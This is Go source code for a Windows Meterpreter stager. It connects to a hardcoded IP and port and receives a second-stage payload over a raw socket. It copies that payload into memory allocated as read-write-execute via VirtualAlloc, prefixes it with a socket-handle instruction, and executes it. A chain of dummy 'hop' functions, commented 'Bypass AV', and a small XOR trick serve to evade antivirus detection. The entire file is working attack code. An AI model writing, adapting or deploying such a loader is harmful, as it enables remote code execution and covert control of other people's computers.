package main

import (
	"encoding/binary"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var MagicNumber int64 = 5

//Bypass AV
func Jump() {
	MagicNumber++
	hop1()
}
func hop1() {
	MagicNumber++
	hop2()
}
func hop2() {
	MagicNumber++
	hop3()
}
func hop3() {
	MagicNumber++
	hop4()
}
func hop4() {
	MagicNumber++
	hop5()
}
func hop5() {
	MagicNumber++
	hop6()
}
func hop6() {
	MagicNumber++
	hop7()
}
func hop7() {
	MagicNumber++
	hop8()
}
func hop8() {
	MagicNumber++
	hop9()
}
func hop9() {
	MagicNumber++
	hop10()
}
func hop10() {
	MagicNumber++
}

//Meterpreter
func mp(Address string) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	var WSA_Data syscall.WSAData
	syscall.WSAStartup(uint32(0x202), &WSA_Data)
	Socket, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)

	AddressArray := strings.Split(Address, ":")
	IP_Array_Str := strings.Split(AddressArray[0], ".")
	var IP_Array_Int [4]int
	for i := 0; i < 4; i++ {
		IP_Array_Int[i], _ = strconv.Atoi(IP_Array_Str[i])
	}
	PortInt, _ := strconv.Atoi(AddressArray[1])
	Socket_Addr := syscall.SockaddrInet4{Port: PortInt, Addr: [4]byte{byte(IP_Array_Int[0]), byte(IP_Array_Int[1]), byte(IP_Array_Int[2]), byte(IP_Array_Int[3])}}

	syscall.Connect(Socket, &Socket_Addr)
	var SecondStageLengt [4]byte
	WSA_Buffer := syscall.WSABuf{Len: uint32(4), Buf: &SecondStageLengt[0]}
	Flags := uint32(0)
	DataReceived := uint32(0)
	syscall.WSARecv(Socket, &WSA_Buffer, 1, &DataReceived, &Flags, nil, nil)
	SecondStageLengthInt := binary.LittleEndian.Uint32(SecondStageLengt[:])

	SecondStageBuffer := make([]byte, SecondStageLengthInt)
	var Shellcode []byte
	WSA_Buffer = syscall.WSABuf{Len: SecondStageLengthInt, Buf: &SecondStageBuffer[0]}
	Flags = uint32(0)
	DataReceived = uint32(0)
	TotalDataReceived := uint32(0)
	for TotalDataReceived < SecondStageLengthInt {
		syscall.WSARecv(Socket, &WSA_Buffer, 1, &DataReceived, &Flags, nil, nil)
		for i := 0; i < int(DataReceived); i++ {
			Shellcode = append(Shellcode, SecondStageBuffer[i])
		}
		TotalDataReceived += DataReceived
	}
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(SecondStageLengthInt+5), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
	SocketPtr := (uintptr)(unsafe.Pointer(Socket))

	//x86  0xBF;  5 bytes
	//  BF 78 56 34 12     =>      mov edi, 0x12345678
	AddrPtr[0] = 0xAF ^ 0x10 //0xBF

	//X64  0x48BF;  10 bytes
	// 48 BF 78 56 34 12 00 00 00 00  =>   mov rdi, 0x12345678

	AddrPtr[1] = byte(SocketPtr)
	AddrPtr[2] = 0x00
	AddrPtr[3] = 0x00
	AddrPtr[4] = 0x00
	for i, j := range Shellcode {
		Jump()
		AddrPtr[i+5] = j
	}
	syscall.Syscall(Addr, 0, 0, 0, 0)
}

func main() {
	s := "http://192.168.121.131:8989"
	Jump()
	mp(s[7:])
}
